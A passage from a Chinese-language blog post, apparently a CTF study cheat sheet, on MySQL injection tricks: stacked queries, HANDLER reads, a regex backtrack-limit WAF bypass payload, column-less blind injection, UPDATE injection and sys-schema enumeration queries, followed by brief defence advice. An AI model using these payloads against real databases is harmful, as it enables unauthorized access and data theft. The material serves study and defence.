注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：2019强网杯——随便注Writeup PHP中堆叠注入的支持情况： Mysqli PDO MySQL 引入的PHP版本 5.0 5.0 3.0之前 PHP5.x是否包含 是 是 是 多语句执行支持情况 是 大多数 否 引自：PDO场景下的SQL注入探究 handler语句代替select查询 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 语法结构： 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 如：通过handler语句查询users表的内容 123456handler users open as yunensec; #指定数据表进行载入并将返回句柄重命名handler yunensec read first; #读取指定表/句柄的首行数据handler yunensec read next; #读取指定表/句柄的下一行数据handler yunensec read next; #读取指定表/句柄的下一行数据...handler yunensec close; #关闭句柄 一些小Trick这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。 PHP/union.+?select/ig绕过。在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。 利用点：PHP正则回溯BUG 具体分析文章：PHP利用PCRE回溯次数限制绕过某些安全限制 PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。 故而我们构造payload：union/*100万个a，充当垃圾数据*/select即可绕过正则判断。 一道相关的CTF题：TetCTF-2020 WP BY MrR3boot 无列名盲注前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order by盲注之外，这里再提一种新的方法，直接通过select进行盲注。 核心payload：(select 'admin','admin')&gt;(select * from users limit 1) 子查询之间也可以直接通过&gt;、&lt;、=来进行判断。 UPDATE注入重复字段赋值即：UPDATA table_name set field1=new_value,field1=new_value2 [where]，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如： 1UPDATE table_name set field1=new_value,field1=(select user()) [where] LIMIT之后的字段数判断我们都知道若注入点在where子语句之后，判断字段数可以用order by或group by来进行判断，而limit后可以利用 into @,@ 判断字段数，其中@为mysql临时变量。 sys系统库 123456789101112#查询所有的库：SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#查询指定库的表（若无则说明此表从未被访问）：SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;#查看所有正在连接的用户详细信息:连接的用户(连接的用户名,连接的ip),当前库,用户状态(Sleep就是空闲),现在在执行的sql语句,上一次执行的sql语句,已经建立连接的时间(秒)SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connections FROM sys.host_summary; 节选自：Mysql的奇淫技巧(黑科技) 视图-&gt;列名 说明 host_summary -&gt; host、total_connections 历史连接IP、对应IP的连接次数 innodb_buffer_stats_by_schema -&gt; object_schema 库名 innodb_buffer_stats_by_table -&gt; object_schema、object_name 库名、表名(可指定) io_global_by_file_by_bytes -&gt; file 路径中包含库名 io_global_by_file_by_latency -&gt; file 路径中包含库名 processlist -&gt; current_statement、last_statement 当前数据库正在执行的语句、该句柄执行的上一条语句 schema_auto_increment_columns -&gt; table_schema、table_name、column_name 库名、表名、列名 schema_index_statistics -&gt; table_schema、table_name 库名、表名 schema_object_overview -&gt; db 库名 schema_table_statistics -&gt; table_schema、table_name 库名、表名 schema_table_statistics_with_buffer -&gt; table_schema、table_name 库名、表名 schema_tables_with_full_table_scans -&gt; object_schema、object_name 库名、表名(全面扫描访问) session -&gt; current_statement、last_statement 当前数据库正在执行的语句、该句柄执行的上一条语句 statement_analysis -&gt; query、db 数据库最近执行的请求、对于请求访问的数据库名 statements_with_* -&gt; query、db 数据库最近执行的特殊情况的请求、对应请求的数据库 version -&gt; mysql_version mysql版本信息 x$innodb_buffer_stats_by_schema 同innodb_buffer_stats_by_schema x$innodb_buffer_stats_by_table 同innodb_buffer_stats_by_table x$io_global_by_file_by_bytes 同io_global_by_file_by_bytes …… 同…… x$schema_flattened_keys -&gt; table_schema、table_name、index_columns 库名、表名、主键名 x$ps_schema_table_statistics_io -&gt; table_schema、table_name、count_read 库名、表名、读取该表的次数 差点忘了，还有mysql数据库也可以查询表名、库名。 12select table_name from mysql.innodb_table_stats where database_name=database();select table_name from mysql.innodb_index_stats where database_name=database(); Mysql注入防御 单引号闭合可控变量，并进行相应的转义处理 尽量使用预编译来执行SQL语句 采用白名单机制/完善黑名单 安装WAF防护软件 拒绝不安全的编码转换，尽量统一编码 关闭错误提示 结语可能记得东西有点多导致很多内容都是精简过后的知识，其实本文可以当做字典一样来使用，可能讲得不是很细致，但是却方便我们进行复习，回想起脑海中的知识。文章花费了大量的笔墨在记录许多与Mysql注入相关的Trick，故而可能会显得比较杂乱，没有得到一个比较好的整理，可能对于不太了解Mysql注入的同学不太友好，望谅解。 参考 【PHP代码审计】入门之路——第二篇-宽字节注入 MySQL注入技巧 Mysql 注入基础小结 Mysql的奇淫技巧(黑科技) Read MySQL Client’s File Dnslog在SQL注入中的实战 从安全角度深入理解MySQL编码转换机制 mysql sys Schema Object Index","link":"/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Charles","slug":"Charles","link":"/tags/Charles/"},{"name":"Android","slug":"Android","link":"/tags/Android/"},{"name":"抓包","slug":"抓包","link":"/tags/%E6%8A%93%E5%8C%85/"},{"name":"Ciscn","slug":"Ciscn","link":"/tags/Ciscn/"},{"name":"Django","slug":"Django","link":"/tags/Django/"},{"name":"JWT","slug":"JWT","link":"/tags/JWT/"},{"name":"微信小程序","slug":"微信小程序","link":"/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"LFI","slug":"LFI","link":"/tags/LFI/"},{"name":"本地包含漏洞","slug":"本地包含漏洞","link":"/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP代码审计","slug":"PHP代码审计","link":"/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Bypass","slug":"Bypass","link":"/tags/Bypass/"},{"name":"WAF","slug":"WAF","link":"/tags/WAF/"},{"name":"webshell","slug":"webshell","link":"/tags/webshell/"},{"name":"奇淫技巧","slug":"奇淫技巧","link":"/tags/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7/"},{"name":"备忘录","slug":"备忘录","link":"/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"},{"name":"学习笔记","slug":"学习笔记","link":"/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"phpmyadmin","slug":"phpmyadmin","link":"/tags/phpmyadmin/"},{"name":"D盾","slug":"D盾","link":"/tags/D%E7%9B%BE/"},{"name":"过狗","slug":"过狗","link":"/tags/%E8%BF%87%E7%8B%97/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"浏览器","slug":"浏览器","link":"/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"工具","slug":"工具","link":"/tags/%E5%B7%A5%E5%85%B7/"},{"name":"个人笔记","slug":"个人笔记","link":"/tags/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"RSA","slug":"RSA","link":"/tags/RSA/"},{"name":"安全测试","slug":"安全测试","link":"/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"name":"hash长度拓展攻击","slug":"hash长度拓展攻击","link":"/tags/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"},{"name":"URL采集","slug":"URL采集","link":"/tags/URL%E9%87%87%E9%9B%86/"},{"name":"易语言","slug":"易语言","link":"/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"},{"name":"读书笔记","slug":"读书笔记","link":"/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"web安全","slug":"web安全","link":"/tags/web%E5%AE%89%E5%85%A8/"},{"name":"BUUCTF","slug":"BUUCTF","link":"/tags/BUUCTF/"},{"name":"Mysql","slug":"Mysql","link":"/tags/Mysql/"}],"categories":[{"name":"原创栏目","slug":"原创栏目","link":"/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"},{"name":"神兵利器","slug":"神兵利器","link":"/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"},{"name":"技术文章","slug":"技术文章","link":"/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"}]}